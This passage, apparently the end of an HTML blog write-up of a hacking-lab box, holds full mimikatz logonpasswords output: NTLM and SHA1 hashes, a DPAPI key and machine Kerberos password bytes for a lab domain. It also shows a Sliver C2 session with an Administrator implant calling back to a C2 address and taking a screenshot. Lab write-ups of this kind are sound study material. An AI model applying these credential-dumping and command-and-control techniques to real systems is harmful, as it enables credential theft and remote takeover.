+mimikatz(commandline) # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 381094 (00000000:0005d0a6)
+Session           : Interactive from 1
+User Name         : cyork
+Domain            : MEGACORP
+Logon Server      : MULTIMASTER
+Logon Time        : 1/22/2024 10:29:55 PM
+SID               : S-1-5-21-3167813660-1240564177-918740779-3107
+        msv :
+         [00000003] Primary
+         * Username : cyork
+         * Domain   : MEGACORP
+         * NTLM     : 06327297532725a64e1edec0aad81cfe
+         * SHA1     : 56380d6f034d060faca78ae4dc90842bbfc5ffe1
+         * DPAPI    : 562c87ff69e458a64559c5a718700f43
+        tspkg :
+        wdigest :
+         * Username : cyork
+         * Domain   : MEGACORP
+         * Password : (null)
+        kerberos :
+         * Username : cyork
+         * Domain   : MEGACORP.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 145404 (00000000:000237fc)
+Session           : Service from 0
+User Name         : MSSQLSERVER
+Domain            : NT Service
+Logon Server      : (null)
+Logon Time        : 1/22/2024 10:29:19 PM
+SID               : S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003
+        msv :
+         [00000003] Primary
+         * Username : MULTIMASTER$
+         * Domain   : MEGACORP
+         * NTLM     : 1a33fc88fa08d631779a310a53aa7deb
+         * SHA1     : 7b66dada748d8246c1972cfb5afeb45d11531aa6
+        tspkg :
+        wdigest :
+         * Username : MULTIMASTER$
+         * Domain   : MEGACORP
+         * Password : (null)
+        kerberos :
+         * Username : MULTIMASTER$
+         * Domain   : MEGACORP.LOCAL
+         * Password : 6e 4f 77 d9 71 28 b9 a6 26 8b 59 aa b5 bf 6f 79 b4 af fe c0 c3 55 80 fd a3 d5 79 cd e0 51 d2 a7 32 60 10 cc 08 8e fe e3 17 d2 88 92 a3 6e a1 33 2a cb 33 99 6a b3 69 d0 25 dc 17 d0 64 aa 88 ed a9 f1 4d 23 3c 24 95 8d a3 95 34 ce 06 37 e2 12 5c 24 7a 0d 2c cb 85 51 04 0b 7b e9 6a df 1f c0 08 5b 48 7b 2f 95 3a 65 bf 94 7d f6 da ae e2 97 f7 6e b2 28 0b b7 fd 31 c0 51 58 0b 18 ee 11 7f 46 71 79 27 02 d8 7e b4 6f 45 98 e9 b5 44 67 c1 da b0 6d 49 41 5b 07 46 dc 60 40 4e cf f6 11 f9 0b 76 92 f9 40 9e f9 50 35 a5 af 0e 03 30 28 5e 25 62 fc b5 67 31 c7 eb c7 1e 96 4e 35 83 53 fe e1 e1 1a a5 88 d6 87 33 b0 48 22 5d bc d0 8c 7a 80 0f 6f a0 57 74 91 91 da a8 26 e6 ae a6 e7 6b d7 8b 54 1e 51 01 3a d9 54 e1 88 4c f9 53 de f8 
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 69226 (00000000:00010e6a)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 1/22/2024 10:28:53 PM
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : MULTIMASTER$
+         * Domain   : MEGACORP
+         * NTLM     : 1a33fc88fa08d631779a310a53aa7deb
+         * SHA1     : 7b66dada748d8246c1972cfb5afeb45d11531aa6
+        tspkg :
+        wdigest :
+         * Username : MULTIMASTER$
+         * Domain   : MEGACORP
+         * Password : (null)
+        kerberos :
+         * Username : MULTIMASTER$
+         * Domain   : MEGACORP.LOCAL
+         * Password : 6e 4f 77 d9 71 28 b9 a6 26 8b 59 aa b5 bf 6f 79 b4 af fe c0 c3 55 80 fd a3 d5 79 cd e0 51 d2 a7 32 60 10 cc 08 8e fe e3 17 d2 88 92 a3 6e a1 33 2a cb 33 99 6a b3 69 d0 25 dc 17 d0 64 aa 88 ed a9 f1 4d 23 3c 24 95 8d a3 95 34 ce 06 37 e2 12 5c 24 7a 0d 2c cb 85 51 04 0b 7b e9 6a df 1f c0 08 5b 48 7b 2f 95 3a 65 bf 94 7d f6 da ae e2 97 f7 6e b2 28 0b b7 fd 31 c0 51 58 0b 18 ee 11 7f 46 71 79 27 02 d8 7e b4 6f 45 98 e9 b5 44 67 c1 da b0 6d 49 41 5b 07 46 dc 60 40 4e cf f6 11 f9 0b 76 92 f9 40 9e f9 50 35 a5 af 0e 03 30 28 5e 25 62 fc b5 67 31 c7 eb c7 1e 96 4e 35 83 53 fe e1 e1 1a a5 88 d6 87 33 b0 48 22 5d bc d0 8c 7a 80 0f 6f a0 57 74 91 91 da a8 26 e6 ae a6 e7 6b d7 8b 54 1e 51 01 3a d9 54 e1 88 4c f9 53 de f8 
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : MULTIMASTER$
+Domain            : MEGACORP
+Logon Server      : (null)
+Logon Time        : 1/22/2024 10:28:52 PM
+SID               : S-1-5-20
+        msv :
+         [00000003] Primary
+         * Username : MULTIMASTER$
+         * Domain   : MEGACORP
+         * NTLM     : 1a33fc88fa08d631779a310a53aa7deb
+         * SHA1     : 7b66dada748d8246c1972cfb5afeb45d11531aa6
+        tspkg :
+        wdigest :
+         * Username : MULTIMASTER$
+         * Domain   : MEGACORP
+         * Password : (null)
+        kerberos :
+         * Username : multimaster$
+         * Domain   : MEGACORP.LOCAL
+         * Password : 6e 4f 77 d9 71 28 b9 a6 26 8b 59 aa b5 bf 6f 79 b4 af fe c0 c3 55 80 fd a3 d5 79 cd e0 51 d2 a7 32 60 10 cc 08 8e fe e3 17 d2 88 92 a3 6e a1 33 2a cb 33 99 6a b3 69 d0 25 dc 17 d0 64 aa 88 ed a9 f1 4d 23 3c 24 95 8d a3 95 34 ce 06 37 e2 12 5c 24 7a 0d 2c cb 85 51 04 0b 7b e9 6a df 1f c0 08 5b 48 7b 2f 95 3a 65 bf 94 7d f6 da ae e2 97 f7 6e b2 28 0b b7 fd 31 c0 51 58 0b 18 ee 11 7f 46 71 79 27 02 d8 7e b4 6f 45 98 e9 b5 44 67 c1 da b0 6d 49 41 5b 07 46 dc 60 40 4e cf f6 11 f9 0b 76 92 f9 40 9e f9 50 35 a5 af 0e 03 30 28 5e 25 62 fc b5 67 31 c7 eb c7 1e 96 4e 35 83 53 fe e1 e1 1a a5 88 d6 87 33 b0 48 22 5d bc d0 8c 7a 80 0f 6f a0 57 74 91 91 da a8 26 e6 ae a6 e7 6b d7 8b 54 1e 51 01 3a d9 54 e1 88 4c f9 53 de f8 
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 381075 (00000000:0005d093)
+Session           : Interactive from 1
+User Name         : cyork
+Domain            : MEGACORP
+Logon Server      : MULTIMASTER
+Logon Time        : 1/22/2024 10:29:55 PM
+SID               : S-1-5-21-3167813660-1240564177-918740779-3107
+        msv :
+         [00000003] Primary
+         * Username : cyork
+         * Domain   : MEGACORP
+         * NTLM     : 06327297532725a64e1edec0aad81cfe
+         * SHA1     : 56380d6f034d060faca78ae4dc90842bbfc5ffe1
+         * DPAPI    : 562c87ff69e458a64559c5a718700f43
+        tspkg :
+        wdigest :
+         * Username : cyork
+         * Domain   : MEGACORP
+         * Password : (null)
+        kerberos :
+         * Username : cyork
+         * Domain   : MEGACORP.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 995 (00000000:000003e3)
+Session           : Service from 0
+User Name         : IUSR
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 1/22/2024 10:29:20 PM
+SID               : S-1-5-17
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 145363 (00000000:000237d3)
+Session           : Service from 0
+User Name         : SQLTELEMETRY
+Domain            : NT Service
+Logon Server      : (null)
+Logon Time        : 1/22/2024 10:29:19 PM
+SID               : S-1-5-80-2652535364-2169709536-2857650723-2622804123-1107741775
+        msv :
+         [00000003] Primary
+         * Username : MULTIMASTER$
+         * Domain   : MEGACORP
+         * NTLM     : 1a33fc88fa08d631779a310a53aa7deb
+         * SHA1     : 7b66dada748d8246c1972cfb5afeb45d11531aa6
+        tspkg :
+        wdigest :
+         * Username : MULTIMASTER$
+         * Domain   : MEGACORP
+         * Password : (null)
+        kerberos :
+         * Username : MULTIMASTER$
+         * Domain   : MEGACORP.LOCAL
+         * Password : 6e 4f 77 d9 71 28 b9 a6 26 8b 59 aa b5 bf 6f 79 b4 af fe c0 c3 55 80 fd a3 d5 79 cd e0 51 d2 a7 32 60 10 cc 08 8e fe e3 17 d2 88 92 a3 6e a1 33 2a cb 33 99 6a b3 69 d0 25 dc 17 d0 64 aa 88 ed a9 f1 4d 23 3c 24 95 8d a3 95 34 ce 06 37 e2 12 5c 24 7a 0d 2c cb 85 51 04 0b 7b e9 6a df 1f c0 08 5b 48 7b 2f 95 3a 65 bf 94 7d f6 da ae e2 97 f7 6e b2 28 0b b7 fd 31 c0 51 58 0b 18 ee 11 7f 46 71 79 27 02 d8 7e b4 6f 45 98 e9 b5 44 67 c1 da b0 6d 49 41 5b 07 46 dc 60 40 4e cf f6 11 f9 0b 76 92 f9 40 9e f9 50 35 a5 af 0e 03 30 28 5e 25 62 fc b5 67 31 c7 eb c7 1e 96 4e 35 83 53 fe e1 e1 1a a5 88 d6 87 33 b0 48 22 5d bc d0 8c 7a 80 0f 6f a0 57 74 91 91 da a8 26 e6 ae a6 e7 6b d7 8b 54 1e 51 01 3a d9 54 e1 88 4c f9 53 de f8 
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 1/22/2024 10:28:53 PM
+SID               : S-1-5-19
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 69747 (00000000:00011073)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 1/22/2024 10:28:53 PM
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : MULTIMASTER$
+         * Domain   : MEGACORP
+         * NTLM     : 289fcbb2f2a91035588e3f090e0a5798
+         * SHA1     : 74600e570585ceda3ce2b5a6b692ee76c79affd9
+        tspkg :
+        wdigest :
+         * Username : MULTIMASTER$
+         * Domain   : MEGACORP
+         * Password : (null)
+        kerberos :
+         * Username : MULTIMASTER$
+         * Domain   : MEGACORP.LOCAL
+         * Password : e3 46 5f c2 15 01 2a ad 9b 1f 7e 0b 37 00 19 bf 52 da 56 b1 c2 0b 5e 7d 00 74 2b 65 c3 4e e3 71 22 b1 4a 4e 9e 00 fd 6d 7a 46 73 80 fc 0b 8b 50 60 09 78 ac 3f 22 07 93 00 98 da 9d 62 c8 78 0b 6d 94 07 4d ec 27 d0 70 ac e5 e0 1c f6 07 19 d5 bd 83 fc 59 f2 b0 a0 89 48 28 64 f7 cd 0f 0e 60 b1 bf 81 2a 20 f4 9e 07 6a 5e e1 23 cd 26 13 c4 30 fe a3 60 e7 36 7a f1 21 fb 1d 41 56 33 2b 01 a1 80 e5 09 fe 8a 1f f6 00 d4 9d 00 09 64 ca d4 24 c0 4e a9 f7 00 58 f5 6e 01 cf 84 bf 9b 0b 24 0d fb 7b c9 1f 33 a2 1a bb c3 cd 4a f1 c7 07 67 53 55 94 39 f1 a5 e5 6b f6 60 c2 b3 d2 d1 88 fc f8 c6 eb 1e 86 20 17 2b 87 a1 95 10 fc bd 35 ea 2f ee 76 2a dc 2c 2e bd 31 1e e7 a5 a3 29 b9 4d 1c 6d d1 c3 83 03 1c 89 59 d0 47 a5 e2 88 31 13 
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 38349 (00000000:000095cd)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 1/22/2024 10:28:51 PM
+SID               : 
+        msv :
+         [00000003] Primary
+         * Username : MULTIMASTER$
+         * Domain   : MEGACORP
+         * NTLM     : 1a33fc88fa08d631779a310a53aa7deb
+         * SHA1     : 7b66dada748d8246c1972cfb5afeb45d11531aa6
+        tspkg :
+        wdigest :
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : MULTIMASTER$
+Domain            : MEGACORP
+Logon Server      : (null)
+Logon Time        : 1/22/2024 10:28:51 PM
+SID               : S-1-5-18
+        msv :
+        tspkg :
+        wdigest :
+         * Username : MULTIMASTER$
+         * Domain   : MEGACORP
+         * Password : (null)
+        kerberos :
+         * Username : multimaster$
+         * Domain   : MEGACORP.LOCAL
+         * Password : (null)
+        ssp :
+        credman :</code></pre>
+
+                <p>For sparks, here's more about sliver:</p>
+
+                <pre><code class="language-plaintext">[server] sliver (NATIONAL_CLIENT) > info
+
+        Session ID: 0ce336ed-107a-4751-996d-a0f2863d60f1
+              Name: NATIONAL_CLIENT
+          Hostname: MULTIMASTER
+              UUID: b7b71442-64b0-d608-d6b6-97dee6f3be99
+          Username: MEGACORP\Administrator
+               UID: S-1-5-21-3167813660-1240564177-918740779-500
+               GID: S-1-5-21-3167813660-1240564177-918740779-513
+               PID: 2352
+                OS: windows
+           Version: Server 2016 build 14393 x86_64
+            Locale: en-US
+              Arch: amd64
+         Active C2: mtls://10.10.14.40:9001
+    Remote Address: 10.129.95.200:49843
+         Proxy URL: 
+Reconnect Interval: 1m0s
+     First Contact: Fri Jan 23 06:46:29 UTC 2024 (4m39s ago)
+      Last Checkin: Fri Jan 23 06:50:54 UTC 2024 (14s ago)
+
+[server] sliver (NATIONAL_CLIENT) > screenshot
+
+[*] Screenshot written to /tmp/screenshot_MULTIMASTER_20240123065112_1223947272.png (0 B)</code></pre>
+
+                <p>I think this is enough sliver for today.</p>
+                
+                <p>Moreover, <a href="mailto:byt3n33dl3@pm.me"><ins>Proton me</ins></a> folks if you have further question and suggestion.</p>
+                
+                <p>Happy hacking!</p>
+                
+                <p class="go-top"><a href="#">Go Top</a></p>
+            </article>
+
+            <footer class="footer">
+                <p>&copy; byt3n33dl3 2024 · Built with blood, sweat, and HTML · <a href="../pages/all.atom.xml">RSS</a></p>
+            </footer>
+        </div>
+    </div>
+</div>
+</body>
+</html>
